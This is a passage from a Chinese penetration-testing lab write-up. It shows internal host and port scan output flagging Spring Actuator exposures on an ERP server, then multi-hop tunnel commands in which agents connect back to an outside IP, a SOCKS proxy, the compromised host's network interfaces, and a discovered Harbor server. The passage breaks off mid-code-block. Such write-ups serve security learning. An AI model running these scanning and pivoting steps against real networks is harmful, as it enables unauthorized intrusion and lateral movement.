</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>20</span><span class=p>]</span> <span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>生成IP范围</span><span class=o>:</span> <span class=mf>172.22</span><span class=o>.</span><span class=mf>10.0</span><span class=o>.%!</span><span class=nx>d</span><span class=p>(</span><span class=nx>string</span><span class=o>=</span><span class=mf>172.22</span><span class=o>.</span><span class=mf>10.255</span><span class=p>)</span> <span class=o>-</span> <span class=o>%!</span><span class=nx>s</span><span class=p>(</span><span class=nx>MISSING</span><span class=p>)</span><span class=o>.%!</span><span class=nx>d</span><span class=p>(</span><span class=nx>MISSING</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>20</span><span class=p>]</span> <span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>解析CIDR</span> <span class=mf>172.22</span><span class=o>.</span><span class=mf>10.0</span><span class=o>/</span><span class=mi>24</span> <span class=o>-&gt;</span> <span class=na>IP范围</span> <span class=mf>172.22</span><span class=o>.</span><span class=mf>10.0</span><span class=o>-</span><span class=mf>172.22</span><span class=o>.</span><span class=mf>10.255</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>20</span><span class=p>]</span> <span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>最终有效主机数量</span><span class=o>:</span> <span class=mi>256</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>20</span><span class=p>]</span> <span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>开始主机扫描</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>20</span><span class=p>]</span> <span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>正在尝试无监听ICMP探测</span><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>20</span><span class=p>]</span> <span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>当前用户权限不足</span><span class=p>,</span><span class=nx>无法发送ICMP包</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>20</span><span class=p>]</span> <span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>切换为PING方式探测</span><span class=o>...</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>21</span><span class=p>]</span> <span class=p>[</span><span class=nx>SUCCESS</span><span class=p>]</span> <span class=nx>目标</span> <span class=mf>172.22</span><span class=o>.</span><span class=mf>10.16</span>    <span class=nx>存活</span> <span class=p>(</span><span class=nx>ICMP</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>21</span><span class=p>]</span> <span class=p>[</span><span class=nx>SUCCESS</span><span class=p>]</span> <span class=nx>目标</span> <span class=mf>172.22</span><span class=o>.</span><span class=mf>10.28</span>    <span class=nx>存活</span> <span class=p>(</span><span class=nx>ICMP</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>26</span><span class=p>]</span> <span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>存活主机数量</span><span class=o>:</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>27</span><span class=p>]</span> <span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>有效端口数量</span><span class=o>:</span> <span class=mi>233</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>27</span><span class=p>]</span> <span class=p>[</span><span class=nx>SUCCESS</span><span class=p>]</span> <span class=nx>端口开放</span> <span class=mf>172.22</span><span class=o>.</span><span class=mf>10.28</span><span class=o>:</span><span class=mi>80</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>27</span><span class=p>]</span> <span class=p>[</span><span class=nx>SUCCESS</span><span class=p>]</span> <span class=nx>端口开放</span> <span class=mf>172.22</span><span class=o>.</span><span class=mf>10.28</span><span class=o>:</span><span class=mi>22</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>27</span><span class=p>]</span> <span class=p>[</span><span class=nx>SUCCESS</span><span class=p>]</span> <span class=nx>端口开放</span> <span class=mf>172.22</span><span class=o>.</span><span class=mf>10.16</span><span class=o>:</span><span class=mi>22</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>27</span><span class=p>]</span> <span class=p>[</span><span class=nx>SUCCESS</span><span class=p>]</span> <span class=nx>端口开放</span> <span class=mf>172.22</span><span class=o>.</span><span class=mf>10.28</span><span class=o>:</span><span class=mi>3306</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>27</span><span class=p>]</span> <span class=p>[</span><span class=nx>SUCCESS</span><span class=p>]</span> <span class=nx>端口开放</span> <span class=mf>172.22</span><span class=o>.</span><span class=mf>10.16</span><span class=o>:</span><span class=mi>8080</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>27</span><span class=p>]</span> <span class=p>[</span><span class=nx>SUCCESS</span><span class=p>]</span> <span class=nx>服务识别</span> <span class=mf>172.22</span><span class=o>.</span><span class=mf>10.28</span><span class=o>:</span><span class=mi>22</span> <span class=o>=&gt;</span> <span class=p>[</span><span class=nx>ssh</span><span class=p>]</span> <span class=nx>版本</span><span class=o>:</span><span class=mf>8.2</span><span class=nx>p1</span> <span class=nx>Ubuntu</span> <span class=mi>4</span><span class=nx>ubuntu0</span><span class=o>.</span><span class=mi>10</span> <span class=nx>产品</span><span class=o>:</span><span class=nx>OpenSSH</span> <span class=nx>系统</span><span class=o>:</span><span class=nx>Linux</span> <span class=nx>信息</span><span class=o>:</span><span class=nx>Ubuntu</span> <span class=nx>Linux</span><span class=p>;</span> <span class=nx>protocol</span> <span class=mf>2.0</span> <span class=nx>Banner</span><span class=o>:</span><span class=p>[</span><span class=nx>SSH</span><span class=o>-</span><span class=mf>2.0</span><span class=o>-</span><span class=nx>OpenSSH_8</span><span class=o>.</span><span class=mi>2</span><span class=nx>p1</span> <span class=nx>Ubuntu</span><span class=o>-</span><span class=mi>4</span><span class=nx>ubuntu0</span><span class=o>.</span><span class=mf>10.</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>27</span><span class=p>]</span> <span class=p>[</span><span class=nx>SUCCESS</span><span class=p>]</span> <span class=nx>服务识别</span> <span class=mf>172.22</span><span class=o>.</span><span class=mf>10.16</span><span class=o>:</span><span class=mi>22</span> <span class=o>=&gt;</span> <span class=p>[</span><span class=nx>ssh</span><span class=p>]</span> <span class=nx>版本</span><span class=o>:</span><span class=mf>8.2</span><span class=nx>p1</span> <span class=nx>Ubuntu</span> <span class=mi>4</span><span class=nx>ubuntu0</span><span class=o>.</span><span class=mi>10</span> <span class=nx>产品</span><span class=o>:</span><span class=nx>OpenSSH</span> <span class=nx>系统</span><span class=o>:</span><span class=nx>Linux</span> <span class=nx>信息</span><span class=o>:</span><span class=nx>Ubuntu</span> <span class=nx>Linux</span><span class=p>;</span> <span class=nx>protocol</span> <span class=mf>2.0</span> <span class=nx>Banner</span><span class=o>:</span><span class=p>[</span><span class=nx>SSH</span><span class=o>-</span><span class=mf>2.0</span><span class=o>-</span><span class=nx>OpenSSH_8</span><span class=o>.</span><span class=mi>2</span><span class=nx>p1</span> <span class=nx>Ubuntu</span><span class=o>-</span><span class=mi>4</span><span class=nx>ubuntu0</span><span class=o>.</span><span class=mf>10.</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>27</span><span class=p>]</span> <span class=p>[</span><span class=nx>SUCCESS</span><span class=p>]</span> <span class=nx>服务识别</span> <span class=mf>172.22</span><span class=o>.</span><span class=mf>10.28</span><span class=o>:</span><span class=mi>3306</span> <span class=o>=&gt;</span> <span class=p>[</span><span class=nx>mysql</span><span class=p>]</span> <span class=nx>版本</span><span class=o>:</span><span class=mf>8.0</span><span class=o>.</span><span class=mi>36</span><span class=o>-</span><span class=mi>0</span><span class=nx>ubuntu0</span><span class=o>.</span><span class=mf>20.04</span><span class=o>.</span><span class=mi>1</span> <span class=nx>产品</span><span class=o>:</span><span class=nx>MySQL</span> <span class=nx>Banner</span><span class=o>:</span><span class=p>[[</span><span class=o>.</span><span class=mf>8.0</span><span class=o>.</span><span class=mi>36</span><span class=o>-</span><span class=mi>0</span><span class=nx>ubuntu0</span><span class=o>.</span><span class=mf>20.04</span><span class=o>.</span><span class=mf>1.</span><span class=nx>V</span><span class=p>;{</span><span class=nx>xY</span> <span class=o>^.</span><span class=mi>0</span> <span class=nx>W</span><span class=p>]</span><span class=nx>En</span><span class=o>:</span> <span class=mi>8</span><span class=nx>uB</span> <span class=nx>caching_sha2_password</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>32</span><span class=p>]</span> <span class=p>[</span><span class=nx>SUCCESS</span><span class=p>]</span> <span class=nx>服务识别</span> <span class=mf>172.22</span><span class=o>.</span><span class=mf>10.28</span><span class=o>:</span><span class=mi>80</span> <span class=o>=&gt;</span> <span class=p>[</span><span class=nx>http</span><span class=p>]</span> <span class=nx>版本</span><span class=o>:</span><span class=mf>1.25</span><span class=o>.</span><span class=mi>4</span> <span class=nx>产品</span><span class=o>:</span><span class=nx>nginx</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>32</span><span class=p>]</span> <span class=p>[</span><span class=nx>SUCCESS</span><span class=p>]</span> <span class=nx>服务识别</span> <span class=mf>172.22</span><span class=o>.</span><span class=mf>10.16</span><span class=o>:</span><span class=mi>8080</span> <span class=o>=&gt;</span> <span class=p>[</span><span class=nx>http</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>32</span><span class=p>]</span> <span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>存活端口数量</span><span class=o>:</span> <span class=mi>5</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>32</span><span class=p>]</span> <span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>开始漏洞扫描</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>32</span><span class=p>]</span> <span class=p>[</span><span class=nx>INFO</span><span class=p>]</span> <span class=nx>加载的插件</span><span class=o>:</span> <span class=nx>mysql</span><span class=p>,</span> <span class=nx>ssh</span><span class=p>,</span> <span class=nx>webpoc</span><span class=p>,</span> <span class=nx>webtitle</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>32</span><span class=p>]</span> <span class=p>[</span><span class=nx>SUCCESS</span><span class=p>]</span> <span class=nx>网站标题</span> <span class=nx>http</span><span class=o>://</span><span class=mf>172.22</span><span class=o>.</span><span class=mf>10.28</span>       <span class=nx>状态码</span><span class=o>:</span><span class=mi>200</span> <span class=nx>长度</span><span class=o>:</span><span class=mi>1975</span>   <span class=nx>标题</span><span class=o>:</span><span class=nx>DooTask</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>32</span><span class=p>]</span> <span class=p>[</span><span class=nx>SUCCESS</span><span class=p>]</span> <span class=nx>网站标题</span> <span class=nx>http</span><span class=o>://</span><span class=mf>172.22</span><span class=o>.</span><span class=mf>10.16</span><span class=o>:</span><span class=mi>8080</span>  <span class=nx>状态码</span><span class=o>:</span><span class=mi>302</span> <span class=nx>长度</span><span class=o>:</span><span class=mi>0</span>      <span class=nx>标题</span><span class=o>:</span><span class=nx>无标题</span> <span class=nx>重定向地址</span><span class=o>:</span> <span class=nx>http</span><span class=o>://</span><span class=mf>172.22</span><span class=o>.</span><span class=mf>10.16</span><span class=o>:</span><span class=mi>8080</span><span class=o>/</span><span class=nx>login</span><span class=p>;</span><span class=nx>jsessionid</span><span class=o>=</span><span class=nx>EFB0A9532795C590DF70C9E786D5D5E4</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>32</span><span class=p>]</span> <span class=p>[</span><span class=nx>SUCCESS</span><span class=p>]</span> <span class=nx>网站标题</span> <span class=nx>http</span><span class=o>://</span><span class=mf>172.22</span><span class=o>.</span><span class=mf>10.16</span><span class=o>:</span><span class=mi>8080</span><span class=o>/</span><span class=nx>login</span><span class=p>;</span><span class=nx>jsessionid</span><span class=o>=</span><span class=nx>EFB0A9532795C590DF70C9E786D5D5E4</span> <span class=nx>状态码</span><span class=o>:</span><span class=mi>200</span> <span class=nx>长度</span><span class=o>:</span><span class=mi>3860</span>   <span class=nx>标题</span><span class=o>:</span><span class=nx>智联科技</span> <span class=nx>ERP</span> <span class=nx>后台登陆</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>33</span><span class=p>]</span> <span class=p>[</span><span class=nx>SUCCESS</span><span class=p>]</span> <span class=nx>目标</span><span class=o>:</span> <span class=nx>http</span><span class=o>://</span><span class=mf>172.22</span><span class=o>.</span><span class=mf>10.16</span><span class=o>:</span><span class=mi>8080</span>
</span></span><span class=line><span class=cl>  <span class=nx>漏洞类型</span><span class=o>:</span> <span class=nx>poc</span><span class=o>-</span><span class=nx>yaml</span><span class=o>-</span><span class=nx>spring</span><span class=o>-</span><span class=nx>actuator</span><span class=o>-</span><span class=nx>heapdump</span><span class=o>-</span><span class=nx>file</span>
</span></span><span class=line><span class=cl>  <span class=nx>漏洞名称</span><span class=o>:</span> 
</span></span><span class=line><span class=cl>  <span class=nx>详细信息</span><span class=o>:</span>
</span></span><span class=line><span class=cl>	<span class=nx>author</span><span class=o>:</span><span class=nx>AgeloVito</span>
</span></span><span class=line><span class=cl>	<span class=nx>links</span><span class=o>:</span><span class=nx>https</span><span class=o>://</span><span class=nx>www</span><span class=o>.</span><span class=nx>cnblogs</span><span class=o>.</span><span class=nx>com</span><span class=o>/</span><span class=nx>wyb628</span><span class=o>/</span><span class=nx>p</span><span class=o>/</span><span class=mf>8567610.</span><span class=nx>html</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mo>03</span><span class=o>-</span><span class=mi>09</span> <span class=mi>11</span><span class=o>:</span><span class=mi>45</span><span class=o>:</span><span class=mi>34</span><span class=p>]</span> <span class=p>[</span><span class=nx>SUCCESS</span><span class=p>]</span> <span class=nx>目标</span><span class=o>:</span> <span class=nx>http</span><span class=o>://</span><span class=mf>172.22</span><span class=o>.</span><span class=mf>10.16</span><span class=o>:</span><span class=mi>8080</span>
</span></span><span class=line><span class=cl>  <span class=nx>漏洞类型</span><span class=o>:</span> <span class=nx>poc</span><span class=o>-</span><span class=nx>yaml</span><span class=o>-</span><span class=nx>springboot</span><span class=o>-</span><span class=nx>env</span><span class=o>-</span><span class=nx>unauth</span>
</span></span><span class=line><span class=cl>  <span class=nx>漏洞名称</span><span class=o>:</span> <span class=nx>spring2</span>
</span></span><span class=line><span class=cl>  <span class=nx>详细信息</span><span class=o>:</span>
</span></span><span class=line><span class=cl>	<span class=nx>links</span><span class=o>:</span><span class=nx>https</span><span class=o>://</span><span class=nx>github</span><span class=o>.</span><span class=nx>com</span><span class=o>/</span><span class=nx>LandGrey</span><span class=o>/</span><span class=nx>SpringBootVulExploit</span>
</span></span></code></pre></td></tr></table></div></div><p>接着开始搭建多层代理</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>./</span><span class=nx>linux_x64_admin</span> <span class=o>-</span><span class=nx>l</span> <span class=mi>1234</span> <span class=o>-</span><span class=nx>s</span> <span class=mi>1234</span>
</span></span><span class=line><span class=cl><span class=o>./</span><span class=nx>linux_x64_agent</span> <span class=o>-</span><span class=nx>c</span> <span class=mf>62.234</span><span class=o>.</span><span class=mf>111.84</span><span class=o>:</span><span class=mi>1234</span> <span class=o>-</span><span class=nx>s</span> <span class=mi>1234</span> <span class=o>--</span><span class=nx>reconnect</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl><span class=o>./</span><span class=nx>linux_x64_agent</span> <span class=o>-</span><span class=nx>c</span> <span class=mf>172.28</span><span class=o>.</span><span class=mf>23.17</span><span class=o>:</span><span class=mi>8777</span> <span class=o>-</span><span class=nx>s</span> <span class=mi>1234</span> <span class=o>--</span><span class=nx>reconnect</span> <span class=mi>8</span>
</span></span></code></pre></td></tr></table></div></div><p>socks隧道启动</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=p>(</span><span class=nx>node</span> <span class=mi>0</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=nx>socks</span> <span class=mi>1235</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Trying</span> <span class=nx>to</span> <span class=nx>listen</span> <span class=nx>on</span> <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span><span class=o>:</span><span class=mf>1235.</span><span class=o>.....</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Waiting</span> <span class=k>for</span> <span class=nx>agent</span><span class=err>&#39;</span><span class=nx>s</span> <span class=nx>response</span><span class=o>......</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Socks</span> <span class=nx>start</span> <span class=nx>successfully</span><span class=o>!</span>
</span></span></code></pre></td></tr></table></div></div><p>目前拿到的这台是ERP，同样需要先进行扫描</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>/</span> <span class=o>&gt;</span><span class=nx>ip</span> <span class=nx>a</span>
</span></span><span class=line><span class=cl><span class=mi>1</span><span class=o>:</span> <span class=nx>lo</span><span class=o>:</span> <span class=o>&lt;</span><span class=nx>LOOPBACK</span><span class=p>,</span><span class=nx>UP</span><span class=p>,</span><span class=nx>LOWER_UP</span><span class=o>&gt;</span> <span class=nx>mtu</span> <span class=mi>65536</span> <span class=nx>qdisc</span> <span class=nx>noqueue</span> <span class=nx>state</span> <span class=nx>UNKNOWN</span> <span class=nx>group</span> <span class=k>default</span> <span class=nx>qlen</span> <span class=mi>1000</span>
</span></span><span class=line><span class=cl>    <span class=nx>link</span><span class=o>/</span><span class=nx>loopback</span> <span class=mo>00</span><span class=o>:</span><span class=mo>00</span><span class=o>:</span><span class=mo>00</span><span class=o>:</span><span class=mo>00</span><span class=o>:</span><span class=mo>00</span><span class=o>:</span><span class=mo>00</span> <span class=nx>brd</span> <span class=mo>00</span><span class=o>:</span><span class=mo>00</span><span class=o>:</span><span class=mo>00</span><span class=o>:</span><span class=mo>00</span><span class=o>:</span><span class=mo>00</span><span class=o>:</span><span class=mo>00</span>
</span></span><span class=line><span class=cl>    <span class=nx>inet</span> <span class=mf>127.0</span><span class=o>.</span><span class=mf>0.1</span><span class=o>/</span><span class=mi>8</span> <span class=nx>scope</span> <span class=nx>host</span> <span class=nx>lo</span>
</span></span><span class=line><span class=cl>       <span class=nx>valid_lft</span> <span class=nx>forever</span> <span class=nx>preferred_lft</span> <span class=nx>forever</span>
</span></span><span class=line><span class=cl>    <span class=nx>inet6</span> <span class=o>::</span><span class=mi>1</span><span class=o>/</span><span class=mi>128</span> <span class=nx>scope</span> <span class=nx>host</span> 
</span></span><span class=line><span class=cl>       <span class=nx>valid_lft</span> <span class=nx>forever</span> <span class=nx>preferred_lft</span> <span class=nx>forever</span>
</span></span><span class=line><span class=cl><span class=mi>2</span><span class=o>:</span> <span class=nx>eth0</span><span class=o>:</span> <span class=o>&lt;</span><span class=nx>BROADCAST</span><span class=p>,</span><span class=nx>MULTICAST</span><span class=p>,</span><span class=nx>UP</span><span class=p>,</span><span class=nx>LOWER_UP</span><span class=o>&gt;</span> <span class=nx>mtu</span> <span class=mi>1500</span> <span class=nx>qdisc</span> <span class=nx>mq</span> <span class=nx>state</span> <span class=nx>UP</span> <span class=nx>group</span> <span class=k>default</span> <span class=nx>qlen</span> <span class=mi>1000</span>
</span></span><span class=line><span class=cl>    <span class=nx>link</span><span class=o>/</span><span class=nx>ether</span> <span class=mo>00</span><span class=o>:</span><span class=mi>16</span><span class=o>:</span><span class=mi>3</span><span class=nx>e</span><span class=o>:</span><span class=mo>05</span><span class=o>:</span><span class=nx>ba</span><span class=o>:</span><span class=mi>7</span><span class=nx>c</span> <span class=nx>brd</span> <span class=nx>ff</span><span class=o>:</span><span class=nx>ff</span><span class=o>:</span><span class=nx>ff</span><span class=o>:</span><span class=nx>ff</span><span class=o>:</span><span class=nx>ff</span><span class=o>:</span><span class=nx>ff</span>
</span></span><span class=line><span class=cl>    <span class=nx>inet</span> <span class=mf>172.28</span><span class=o>.</span><span class=mf>23.33</span><span class=o>/</span><span class=mi>16</span> <span class=nx>brd</span> <span class=mf>172.28</span><span class=o>.</span><span class=mf>255.255</span> <span class=nx>scope</span> <span class=k>global</span> <span class=nx>dynamic</span> <span class=nx>eth0</span>
</span></span><span class=line><span class=cl>       <span class=nx>valid_lft</span> <span class=mi>1892156851</span><span class=nx>sec</span> <span class=nx>preferred_lft</span> <span class=mi>1892156851</span><span class=nx>sec</span>
</span></span><span class=line><span class=cl>    <span class=nx>inet6</span> <span class=nx>fe80</span><span class=o>::</span><span class=mi>216</span><span class=o>:</span><span class=mi>3</span><span class=nx>eff</span><span class=o>:</span><span class=nx>fe05</span><span class=o>:</span><span class=nx>ba7c</span><span class=o>/</span><span class=mi>64</span> <span class=nx>scope</span> <span class=nx>link</span> 
</span></span><span class=line><span class=cl>       <span class=nx>valid_lft</span> <span class=nx>forever</span> <span class=nx>preferred_lft</span> <span class=nx>forever</span>
</span></span><span class=line><span class=cl><span class=mi>3</span><span class=o>:</span> <span class=nx>eth1</span><span class=o>:</span> <span class=o>&lt;</span><span class=nx>BROADCAST</span><span class=p>,</span><span class=nx>MULTICAST</span><span class=p>,</span><span class=nx>UP</span><span class=p>,</span><span class=nx>LOWER_UP</span><span class=o>&gt;</span> <span class=nx>mtu</span> <span class=mi>1500</span> <span class=nx>qdisc</span> <span class=nx>mq</span> <span class=nx>state</span> <span class=nx>UP</span> <span class=nx>group</span> <span class=k>default</span> <span class=nx>qlen</span> <span class=mi>1000</span>
</span></span><span class=line><span class=cl>    <span class=nx>link</span><span class=o>/</span><span class=nx>ether</span> <span class=mo>00</span><span class=o>:</span><span class=mi>16</span><span class=o>:</span><span class=mi>3</span><span class=nx>e</span><span class=o>:</span><span class=mo>05</span><span class=o>:</span><span class=nx>ba</span><span class=o>:</span><span class=mi>7</span><span class=nx>e</span> <span class=nx>brd</span> <span class=nx>ff</span><span class=o>:</span><span class=nx>ff</span><span class=o>:</span><span class=nx>ff</span><span class=o>:</span><span class=nx>ff</span><span class=o>:</span><span class=nx>ff</span><span class=o>:</span><span class=nx>ff</span>
</span></span><span class=line><span class=cl>    <span class=nx>inet</span> <span class=mf>172.22</span><span class=o>.</span><span class=mf>10.16</span><span class=o>/</span><span class=mi>24</span> <span class=nx>brd</span> <span class=mf>172.22</span><span class=o>.</span><span class=mf>10.255</span> <span class=nx>scope</span> <span class=k>global</span> <span class=nx>eth1</span>
</span></span><span class=line><span class=cl>       <span class=nx>valid_lft</span> <span class=nx>forever</span> <span class=nx>preferred_lft</span> <span class=nx>forever</span>
</span></span><span class=line><span class=cl>    <span class=nx>inet6</span> <span class=nx>fe80</span><span class=o>::</span><span class=mi>216</span><span class=o>:</span><span class=mi>3</span><span class=nx>eff</span><span class=o>:</span><span class=nx>fe05</span><span class=o>:</span><span class=nx>ba7e</span><span class=o>/</span><span class=mi>64</span> <span class=nx>scope</span> <span class=nx>link</span> 
</span></span><span class=line><span class=cl>       <span class=nx>valid_lft</span> <span class=nx>forever</span> <span class=nx>preferred_lft</span> <span class=nx>forever</span>
</span></span></code></pre></td></tr></table></div></div><p>并在<code>http://172.22.14.46/</code>​上发现了一台harbor</p><p>使用<a href=https://github.com/404tk/CVE-2022-46463>404tk/CVE-2022-46463: harbor unauthorized detection</a>下载镜像</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
